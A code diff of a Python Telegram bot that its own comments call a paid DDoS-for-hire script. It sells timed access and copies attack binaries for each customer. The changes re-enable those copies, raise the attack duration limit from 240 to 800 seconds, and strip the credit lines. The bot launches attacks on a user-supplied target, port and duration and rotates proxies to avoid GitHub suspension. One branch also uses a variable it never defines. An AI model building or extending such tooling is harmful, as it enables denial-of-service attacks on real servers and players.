@@ -14,7 +14,7 @@ from requests.exceptions import ReadTimeout, ConnectionError
 # Load configuration
 CONFIG_FILE = 'config.json'
 ORIGINAL_BGMI_PATH = '/workspaces/venom-V5-Testing/bgmi'      #ADD YOUR FILES PATH HERE 
-#ORIGINAL_SAHIL_PATH = '/workspaces/venom-V5-Testing/bgmi2'    #ADD YOUR FILES PATH HERE 
+ORIGINAL_BGMI2_PATH = '/workspaces/venom-V5-Testing/bgmi2'    #ADD YOUR FILES PATH HERE 
 
 def update_proxy():    #AUTOMATICALLY CHANGES YOUR IP AND SAVES YOU FROM SUSPEND OF GITHUB ACCOUNT AND ALSO CHANGES YOUR IP EVERY SECOND
     proxy_list = [
@@ -152,8 +152,8 @@ def add_user(message):
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
                 user_venom_path = f'venom{user_id}'
-                #shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                #shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_BGMI2_PATH, user_bgmi2_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -172,9 +172,9 @@ def add_user(message):
 
                 # Create copies of bgmi,sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
-               # shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-               # shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                user_bgmi2_path = f'bgmi2{user_id}'
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_BGMI2_PATH, user_bgmi2_path)
 
                 response = f"User {user_id} added successfully for {hours} hours by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -256,7 +256,7 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"sahil{user_id}"
+    bgmi2_file = f"bgmi2{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
@@ -292,7 +292,7 @@ def handle_attack_details(message):
             duration = int(duration)
 
             # Restrict attack duration for normal users
-            MAX_DURATION = 240  # Set maximum duration (in seconds) for Normal users
+            MAX_DURATION = 800  # Set maximum duration (in seconds) for Normal users
             if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                 bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                 return
@@ -367,12 +367,4 @@ if __name__ == '__main__':
             time.sleep(1)
 
 
-    # SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER)
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER
+
